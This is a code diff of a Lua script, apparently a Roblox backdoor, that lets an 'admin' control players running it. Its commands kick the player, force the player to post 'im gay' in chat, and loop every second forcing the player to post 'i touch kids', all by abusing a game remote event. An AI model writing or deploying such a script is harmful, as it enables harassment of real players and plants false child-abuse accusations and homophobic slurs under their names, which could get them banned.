@@ -53,16 +53,16 @@ local function ExecuteCommand(Args, Admin)
     elseif cmdWord1 == Prefix.."kick" then
         local reason = table.concat(Args, " ", 3)
         if reason and reason ~= "" then
-            LocalPlayer:Kick(string.format("Kicked by posral admin (%s): %s", Admin.DisplayName, reason))
+            LocalPlayer:Kick(string.format("Kicked by  admin (%s): %s", Admin.DisplayName, reason))
         else
-            LocalPlayer:Kick(string.format("Kicked by posral admin (%s)", Admin.DisplayName))
+            LocalPlayer:Kick(string.format("Kicked by admin (%s)", Admin.DisplayName))
         end
     elseif cmdWord1 == Prefix.."reveal" then
-        ExtendGrabLine:FireServer("Ya Nasral! //chat")
+        ExtendGrabLine:FireServer("im gay //chat")
     elseif cmdWord1 == Prefix.."report" then
         spawn(function()
             while true do
-                ExtendGrabLine:FireServer("i touch kids //chat")
+                ExtendGrabLine:FireServer("i touch kidssssss //chat")
                 task.wait(1)
             end
         end)
